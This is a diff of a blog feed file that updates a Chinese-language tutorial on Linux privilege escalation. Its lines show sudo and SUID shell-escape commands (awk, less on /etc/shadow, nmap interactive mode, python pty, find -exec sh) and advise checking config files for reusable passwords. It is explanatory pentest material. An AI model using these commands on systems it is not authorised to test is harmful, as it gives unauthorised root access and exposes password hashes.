@@ -843,7 +843,7 @@
     <link href="http://kevien.github.io/2017/10/10/linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
     <id>http://kevien.github.io/2017/10/10/linux权限提升/</id>
     <published>2017-10-10T04:35:24.000Z</published>
-    <updated>2018-12-01T09:50:37.936Z</updated>
+    <updated>2018-12-01T13:32:48.295Z</updated>
     
     <content type="html"><![CDATA[<p><img src="/2017/10/10/linux权限提升/linuxprivilegeescalation.jpg" alt=""></p>
 <h2 id="Brief"><a href="#Brief" class="headerlink" title="Brief"></a>Brief</h2><ul>
@@ -880,7 +880,7 @@
 <li><p>用户安装的第三方软件是否是存在漏洞的，如果有的话可以google一下exploit。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"># 常见的安装软件目录</div><div class="line">/usr/local/</div><div class="line">/usr/local/src</div><div class="line">/usr/local/bin</div><div class="line">/opt/</div><div class="line">/home</div><div class="line">/var/</div><div class="line">/usr/src/</div><div class="line"></div><div class="line"># Debian</div><div class="line">dpkg -l</div><div class="line"></div><div class="line"># CentOS, OpenSuse, Fedora, RHEL</div><div class="line">rpm -qa (CentOS / openSUSE )</div><div class="line"></div><div class="line"># OpenBSD, FreeBSD</div><div class="line">pkg_info</div></pre></td></tr></table></figure>
 </li>
-<li><p>然后查找对应的软件是否有漏洞</p>
+<li><p>然后查找对应的软件是否有漏洞并查找对应的exploit</p>
 <h2 id="弱口令或者明文密码"><a href="#弱口令或者明文密码" class="headerlink" title="弱口令或者明文密码"></a>弱口令或者明文密码</h2></li>
 <li>检查一下web服务器连接数据库的配置文件(例如config.php)</li>
 <li>检查一下数据库的管理员密码，这个密码可能被重用。</li>
@@ -906,11 +906,14 @@
 <li><p>awk</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">awk &apos;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&apos;</div></pre></td></tr></table></figure>
 </li>
-<li><p>less</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo less /etc/shadow</div><div class="line">v</div><div class="line">:shell</div></pre></td></tr></table></figure>
+<li><p>more<br><img src="/2017/10/10/linux权限提升/more.png" alt=""></p>
 </li>
-<li><p>nmap</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">低版本的nmap3.x 有interactive模式，且设置了suid，这个时候可以进入交互模式 执行!sh 命令即可轻松完成提权。</div></pre></td></tr></table></figure>
+<li>less<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo less /etc/shadow</div><div class="line">v</div><div class="line">:shell</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2017/10/10/linux权限提升/less.png" alt=""></p>
+<ul>
+<li>nmap<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">低版本的nmap3.x 有interactive模式，且设置了suid，这个时候可以进入交互模式 执行!sh 命令即可轻松完成提权。</div></pre></td></tr></table></figure>
 </li>
 </ul>
 <p><img src="/2017/10/10/linux权限提升/nmaproot.png" alt=""></p>
@@ -918,7 +921,7 @@
 <li>python<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’</div></pre></td></tr></table></figure>
 </li>
 </ul>
-<p><img src="/2017/10/10/linux权限提升/python.png" alt=""></p>
+<p><img src="/2017/10/10/linux权限提升/python.png" alt=""><br><img src="/2017/10/10/linux权限提升/sudoabuse.png" alt=""></p>
 <ul>
 <li>find <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo find /home -exec sh -i \;</div></pre></td></tr></table></figure>
 </li>
